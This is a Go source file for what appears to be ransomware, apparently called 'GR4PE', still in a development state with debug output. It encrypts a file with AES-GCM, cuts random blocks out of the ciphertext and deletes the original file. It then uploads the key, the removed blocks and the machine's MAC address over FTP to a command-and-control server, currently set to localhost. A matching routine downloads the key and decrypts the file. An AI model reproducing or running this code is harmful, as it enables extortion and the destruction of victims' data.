package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/jlaffaye/ftp"
)

type Header struct {
	signiture []byte //.GR4PE
	filename  []byte //FILENAME
}

type uploadData struct {
	signiture []byte     //.GR4PE
	filename  []byte     //FILENAME
	mac       []byte     //MAC.0xFFFFFFFFFFFF
	Data      []DataByte //IDXn.0xFFFFFFFFFFFF
	key       []byte     //key
}

type Data struct {
	idx  uint64 //IDXn.0xFFFFFFFFFFFF
	data []byte //data
}

type DataByte struct {
	idx  []byte //IDXn.0xFFFFFFFFFFFF
	data []byte //data
}

func check(e error) {
	if e != nil && e != io.EOF {
		panic(e)
	}
}

func filenameHash(data string) string {
	return hex.EncodeToString(md5.New().Sum([]byte(data)))
}

func uploadDataToString(data uploadData) string {
	datas := make([]string, len(data.Data))
	for i := 0; i < len(data.Data); i++ {
		datas[i] = string(data.Data[i].idx) + string(data.Data[i].data)
	}
	return string(data.signiture) + string(data.filename) + string(data.mac) + strings.Join(datas, "") + string(data.key)
}

func randRange(min, max, cnt int64) []uint64 {
	var ret []uint64
	for i := int64(0); i < cnt; i++ {
		n, err := rand.Int(rand.Reader, big.NewInt(max-min))
		check(err)
		for j := 0; j < len(ret); j++ {
			if ret[j]-uint64(n.Int64()+min) < 4096 {
				n, err = rand.Int(rand.Reader, big.NewInt(max-min))
				check(err)
				j = 0
			}
		}
		ret = append(ret, uint64(n.Int64()+min))
	}
	return ret
}

func genEncryptionKey() *[32]byte {
	key := [32]byte{}
	_, err := io.ReadFull(rand.Reader, key[:])
	check(err)
	return &key
}

func encrypt(data []byte, key *[32]byte) (cipherText []byte, err error) {
	block, err := aes.NewCipher(key[:])
	check(err)

	gcm, err := cipher.NewGCM(block)
	check(err)

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	check(err)

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func decrypt(data []byte, key *[32]byte) (plainText []byte, err error) {
	block, err := aes.NewCipher(key[:])
	check(err)

	gcm, err := cipher.NewGCM(block)
	check(err)

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("len(data) < nonceSize")
	}

	nonce, cipherText := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, cipherText, nil)
}

func encryptFile(filename string, key *[32]byte) {
	BUFER_SIZE := int64(4096)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	wfile, err := os.OpenFile(filename+".GR4PE", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer wfile.Close()
	wfileDEBUG, err := os.Create(filename + ".GR4PEDEBUG")
	check(err)
	defer wfileDEBUG.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	for i := int64(0); i < fileInfo.Size()/BUFER_SIZE; i++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		cipherText, err := encrypt(buf, key)
		check(err)
		_, err = wfile.Write(cipherText)
		_, err = wfileDEBUG.Write(cipherText)
		if i == 0 {
			fmt.Println("cipherText: ", cipherText)
			fmt.Println("len: ", len(cipherText))
		}
		check(err)
	}
	buf := make([]byte, fileInfo.Size()%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	cipherText, err := encrypt(buf, key)
	check(err)
	_, err = wfile.Write(cipherText)
	_, err = wfileDEBUG.Write(cipherText)
	check(err)
}

func decryptFile(filename string, key *[32]byte) {
	BUFER_SIZE := int64(4124)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	wfile, err := os.Create(filename + ".dec")
	check(err)
	defer wfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	// buf := make([]byte, 100)
	// _, err = rfile.Read(buf)
	// check(err)
	headerEnd := 0
	// headerEnd := strings.Index(string(buf), "...") + 3
	// fmt.Println("headerEnd: ", headerEnd)
	// rfile.Seek(int64(headerEnd), 0)
	fileSize := fileInfo.Size() - int64(headerEnd)
	for i := int64(0); i < (fileSize / BUFER_SIZE); i++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		//fmt.Println("buf: ", buf)
		check(err)
		plainText, err := decrypt(buf, key)
		//fmt.Println("plainText: ", plainText)
		check(err)
		_, err = wfile.Write(plainText)
		check(err)
	}
	buf := make([]byte, fileSize%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	plainText, err := decrypt(buf, key)
	check(err)
	_, err = wfile.Write(plainText)
	check(err)

}

func readByte(filename string, offset int64, length int64) ([]byte, error) {
	file, err := os.Open(filename)
	check(err)
	defer file.Close()
	fileInfo, err := file.Stat()
	check(err)
	if length == -1 {
		length = fileInfo.Size() - offset
	}
	if offset+length > fileInfo.Size() {
		return nil, fmt.Errorf("offset+length > fileInfo.Size()")
	}
	_, err = file.Seek(offset, 0)
	check(err)
	buf := make([]byte, length)
	_, err = file.Read(buf)
	check(err)
	return buf, nil
}

func readNwriteBuf(wfile *os.File, rfile *os.File, buf []byte) {
	_, err := rfile.Read(buf)
	check(err)

	_, err = wfile.Write(buf)
	check(err)
}

func removeByte(filename string, offset int64, length int64, idx int64) (string, error) {
	BUFER_SIZE := int64(4096)
	ret, err := readByte(filename, offset, length)
	check(err)
	rfile, err := os.Open(filename)
	check(err)
	fileInfo, err := rfile.Stat()
	fileSize := fileInfo.Size()
	fmt.Println(fileSize)
	check(err)
	wfile, err := os.Create(filename + ".tmp")
	check(err)
	defer rfile.Close()
	defer wfile.Close()
	for i := int64(0); i < (offset / BUFER_SIZE); i++ {
		buf := make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	buf := make([]byte, offset%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	wfile.Write(append([]byte(idxToString(idx, uint64(offset))), []byte("...")...))
	_, err = rfile.Seek(length, 1)
	fileSize -= length
	check(err)
	fmt.Println("fileSize: ", fileSize)
	fmt.Println("offset: ", offset)
	fmt.Println("fileSize-offset: ", fileSize-offset)
	for i := int64(0); i < ((fileSize - offset) / BUFER_SIZE); i++ {
		buf = make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	fmt.Println("fileSize-offset%BUFER_SIZE: ", (fileSize-offset)%BUFER_SIZE)
	buf = make([]byte, (fileSize-offset)%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	os.Remove(filename)
	os.Rename(filename+".tmp", filename)
	return string(ret), nil
}

// data to string
func idxToString(idx int64, loc uint64) string {
	var data []byte
	data = append(data, []byte(
		"IDX"+strconv.Itoa(int(idx))+string(
			[]byte(".0x"+
				strings.Repeat("0", (12-len(strconv.FormatUint(loc, 16))))+
				strconv.FormatUint(loc, 16))))...,
	)
	return string(data)
}

func genUploadHeader(filename []byte, deletedData []Data, key *[32]byte) uploadData {
	databyte := make([]DataByte, len(deletedData))
	for i := 0; i < len(deletedData); i++ {
		databyte[i] = DataByte{
			idx:  append([]byte(idxToString(int64(i), deletedData[i].idx)), []byte("...")...),
			data: deletedData[i].data,
		}
	}
	return uploadData{
		[]byte(".GR4PE"),
		append(filename, []byte("...")...),
		append(
			[]byte("MAC."),
			[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
		),
		databyte,
		[]byte(fmt.Sprintf("...%x", key)),
	}
}

func putHeader(header Header) {
	wfile, err := os.Create(string(header.filename) + ".GR4PE")
	check(err)
	defer wfile.Close()
	_, err = wfile.Write(header.signiture)
	check(err)
	_, err = wfile.Write(append(header.filename, []byte("...")...))
	check(err)
}

func carveData(filename string) []Data {
	BUFER_SIZE := int64(4096)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	carveCount := fileInfo.Size() / (BUFER_SIZE * 20)
	//carveCount := int64(1)
	fmt.Println(carveCount)
	carveIdx := make([]uint64, carveCount)
	carveDatas := make([]Data, carveCount)
	randlist := randRange(0, fileInfo.Size()-(4096*carveCount), carveCount)
	sort.Slice(randlist, func(i, j int) bool { return randlist[i] < randlist[j] })
	fmt.Println(randlist)
	for i := int64(0); i < carveCount; i++ {
		carveIdx[i] = randlist[i]
		buf, _ := removeByte(filename, int64(carveIdx[i]), 4096, i)
		check(err)
		carveDatas[i] = Data{
			idx:  carveIdx[i],
			data: []byte(buf),
		}
	}
	return carveDatas
}

func getMacAddr() string {
	interfaces, err := net.Interfaces()
	check(err)
	for _, inter := range interfaces {
		if inter.Name == "eth0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en1" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlp3s0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan1" {
			return inter.HardwareAddr.String()
		}
	}
	return ""
}

func ftpUpload(filename string, data []byte) (int, error) {
	C2SERVER := "localhost:9021"
	USERNAME := "anonymous"
	PASSWORD := "anonymous"

	uploader, err := ftp.Dial(C2SERVER)
	check(err)
	err = uploader.Login(USERNAME, PASSWORD)
	check(err)
	uid := strings.Replace(getMacAddr(), ":", "", -1)
	_ = uploader.MakeDir(uid)
	err = uploader.ChangeDir(uid)
	check(err)
	err = uploader.Stor(filename, strings.NewReader(string(data)))
	check(err)
	return 1, nil
}

func ftpDownload(filename string) ([]byte, error) {
	C2SERVER := "localhost:9021"
	USERNAME := "down"
	PASSWORD := "loader"

	downloader, err := ftp.Dial(C2SERVER)
	check(err)
	err = downloader.Login(USERNAME, PASSWORD)
	check(err)
	uid := strings.Replace(getMacAddr(), ":", "", -1)
	_ = downloader.MakeDir(uid)
	err = downloader.ChangeDir(uid)
	check(err)
	r, err := downloader.Retr(filenameHash(filename))
	check(err)
	buf := make([]byte, 4096*4)
	buf, err = io.ReadAll(r)
	check(err)
	return buf, nil
}

func encryptAndUpload(filename string) {
	key := genEncryptionKey()
	putHeader(
		Header{
			[]byte(".GR4PE"),
			[]byte(filename),
		},
	)
	encryptFile(filename, key)
	uploadHeader := genUploadHeader(
		[]byte(filename),
		carveData(filename+".GR4PE"),
		key,
	)
	os.Remove(filename)
	ftpUpload(filenameHash(filename), []byte(uploadDataToString(uploadHeader)))
}

func putBackData(filename string, uploaddata uploadData, header Header, idx []uint64) {
	fmt.Println("args: ", filename, uploaddata, header, idx)
	BUFER_SIZE := uint64(4096)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	buf, err := readByte(filename, 0, 100)
	check(err)
	wfile, err := os.Create(filename + ".tmp")
	check(err)
	defer wfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	fileSize := fileInfo.Size()
	offsetSum := uint64(0)
	for i := 0; i < len(idx)-1; i++ {
		fmt.Println("idx[i]: ", idx[i])
		for j := uint64(0); j < idx[i]/BUFER_SIZE; j++ {
			buf := make([]byte, BUFER_SIZE)
			_, err = rfile.Read(buf)
			check(err)
			_, err = wfile.Write(buf)
			check(err)
		}
		buf := make([]byte, idx[i]%BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		_, err = wfile.Write(buf)
		check(err)
		rfile.Seek(22, 1)
		_, err = wfile.Write(uploaddata.Data[i].data)
		check(err)
		offsetSum += idx[i] + 22
		idx[i+1] -= offsetSum

	}
	currentLoc, err := rfile.Seek(0, 1)
	for j := uint64(0); j < idx[len(idx)-1]/BUFER_SIZE; j++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		_, err = wfile.Write(buf)
		check(err)
	}
	buf = make([]byte, idx[len(idx)-1]%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	_, err = wfile.Write(buf)
	check(err)
	rfile.Seek(22, 1)
	_, err = wfile.Write(uploaddata.Data[len(idx)-1].data)
	check(err)
	offsetSum += idx[len(idx)-1] + 22 + uint64(len(uploaddata.Data[len(idx)-1].data))
	currentLoc, err = rfile.Seek(0, 1)
	for j := uint64(0); j < uint64(fileSize-currentLoc)/BUFER_SIZE; j++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		_, err = wfile.Write(buf)
		check(err)
	}
	buf = make([]byte, uint64(fileSize-currentLoc)%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	_, err = wfile.Write(buf)
	check(err)

	os.Remove(filename)
	os.Rename(filename+".tmp", filename)
}

func parseUploadData(data []byte) uploadData {
	sig := data[0:6]
	filename := data[6:strings.Index(string(data), "...")]
	mac := data[strings.Index(string(data), "MAC.") : strings.Index(string(data), "MAC.")+16]
	key := data[strings.LastIndex(string(data), "...")+3 : strings.LastIndex(string(data), "...")+68]
	fmt.Println("key: ", key)
	parsedData := make([]DataByte, strings.Count(string(data), "IDX"))
	for i := 0; i < strings.Count(string(data), "IDX")-1; i++ {
		parsedData[i] = DataByte{
			idx:  []byte(data[strings.Index(string(data), "IDX"+strconv.Itoa(i)) : strings.Index(string(data), "IDX"+strconv.Itoa(i))+19]),
			data: data[strings.Index(string(data), "IDX"+strconv.Itoa(i))+22 : strings.Index(string(data), "IDX"+strconv.Itoa(i+1))],
		}
	}
	parsedData[strings.Count(string(data), "IDX")-1] = DataByte{
		idx:  []byte(data[strings.LastIndex(string(data), "IDX") : strings.LastIndex(string(data), "IDX")+19]),
		data: data[strings.LastIndex(string(data), "IDX")+22 : strings.LastIndex(string(data), "...")],
	}
	fmt.Println("parseData", parsedData[0])
	return uploadData{
		sig,
		filename,
		mac,
		parsedData,
		key,
	}
}

func findFromFile(filename string, data []byte) []int64 {
	BUFER_SIZE := len(data)
	file, err := os.Open(filename)
	check(err)
	defer file.Close()
	fileInfo, err := file.Stat()
	check(err)
	buf := make([]byte, BUFER_SIZE)
	ret := make([]int64, 0)
	for i := int64(0); i < fileInfo.Size(); i++ {
		file.Seek(i, 0)
		_, err = file.Read(buf)
		check(err)
		if strings.Contains(string(buf), string(data)) {
			ret = append(ret, int64(strings.Index(string(buf), string(data)))+i)
		}
	}
	return ret
}

func parseEncData(filename string) (Header, []uint64) {
	data, _ := readByte(filename, 0, 100)
	sig := data[0:6]
	orig_filename := data[6:strings.Index(string(data), "...")]
	findIDXFrom := findFromFile(filename, []byte("IDX"))
	println(len(findIDXFrom))
	idx := make([]uint64, len(findIDXFrom))
	for i := 0; i < len(findIDXFrom); i++ {
		idx[i] = uint64(findIDXFrom[i])
	}
	return Header{sig, orig_filename}, idx
}

func main() {
	//encryptAndUpload("tmpfile/in/test copy")
	buf, _ := ftpDownload("tmpfile/in/test copy")
	data := parseUploadData(buf)
	fmt.Println(genEncryptionKey())
	dataKeyByte, _ := hex.DecodeString(string(data.key)[1:])
	decryptFile("tmpfile/in/test copy.GR4PEDEBUG", (*[32]byte)(dataKeyByte))
}
